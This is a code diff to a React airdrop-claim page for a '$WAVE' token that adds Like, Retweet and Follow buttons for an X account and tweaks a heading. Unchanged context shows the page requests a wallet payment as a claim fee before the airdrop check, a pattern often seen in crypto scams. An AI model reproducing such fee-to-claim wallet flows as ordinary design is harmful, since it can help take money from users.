@@ -64,7 +64,6 @@ export default function AirdropPage({
         setTotalClaimed(0)
         return
       }
-
       if (typeof window !== "undefined" && window.ethereum) {
         try {
           await window.ethereum.request({
@@ -99,7 +98,6 @@ export default function AirdropPage({
             return
           }
         }
-
         try {
           const result = await window.ethereum.request({
             method: "eth_call",
@@ -159,7 +157,6 @@ export default function AirdropPage({
         setIsClaiming(false)
         return
       }
-
       // Calculate fee amount
       const feeAmount = await getPaymentAmount()
       // Send payment transaction
@@ -243,6 +240,7 @@ export default function AirdropPage({
             </div>
           </div>
         )}
+        {/* SOCIAL MODAL WITH RT/LIKE/FOLLOW BUTTONS */}
         {showSocialModal && (
           <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
             <div className="bg-slate-900/90 backdrop-blur-md border border-blue-300/30 rounded-xl p-6 max-w-md w-full mx-4 shadow-2xl">
@@ -259,14 +257,48 @@ export default function AirdropPage({
                   <li>• Then return here to continue</li>
                 </ul>
               </div>
-              <a
-                href="https://x.com/SadlifeTv_/status/1769708489658495122"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="block w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 rounded-lg font-semibold text-center transition-all duration-300 backdrop-blur-sm border border-blue-300/20 mb-4"
-              >
-                Open X Post
-              </a>
+              {/* BEGIN BUTTONS BLOCK */}
+              <div className="flex flex-col gap-3 mb-4">
+                <a
+                  href="https://x.com/SadlifeTv_/status/1769708489658495122"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="w-full py-3 bg-blue-500 hover:bg-blue-400 hover:shadow-lg hover:shadow-blue-400/50 
+                    rounded-lg font-semibold text-center transition-all duration-300 backdrop-blur-sm border border-blue-300/20"
+                >
+                  Open X Post
+                </a>
+                <div className="flex gap-2 justify-center">
+                  <a
+                    href="https://twitter.com/intent/like?tweet_id=1769708489658495122"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="px-4 py-2 bg-pink-600 hover:bg-pink-400 rounded-lg font-semibold text-white text-sm shadow-md transition"
+                    title="Like on X"
+                  >
+                    ❤️ Like
+                  </a>
+                  <a
+                    href="https://twitter.com/intent/retweet?tweet_id=1769708489658495122"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="px-4 py-2 bg-green-600 hover:bg-green-400 rounded-lg font-semibold text-white text-sm shadow-md transition"
+                    title="Retweet on X"
+                  >
+                    🔁 RT
+                  </a>
+                  <a
+                    href="https://twitter.com/intent/follow?screen_name=SadlifeTv_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="px-4 py-2 bg-yellow-500 hover:bg-yellow-400 rounded-lg font-semibold text-white text-sm shadow-md transition"
+                    title="Follow @SadlifeTv"
+                  >
+                    ➕ Follow
+                  </a>
+                </div>
+              </div>
+              {/* END BUTTONS BLOCK */}
               <div className="flex gap-3">
                 <button
                   onClick={proceedWithAirdropCheck}
@@ -318,7 +350,7 @@ export default function AirdropPage({
         <h1 className="text-4xl md:text-6xl font-bold mb-4 text-center tracking-wide bg-gradient-to-r from-purple-400 via-pink-500 to-red-500 bg-clip-text text-transparent animate-pulse">
           $WAVE
         </h1>
-        <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility</p>
+        <p className="text-lg md:text-xl text-blue-100 mb-8 text-center">Check your wallet eligibility for $WAVE</p>
         <div className="mb-6">
           {!isConnected ? (
             <button
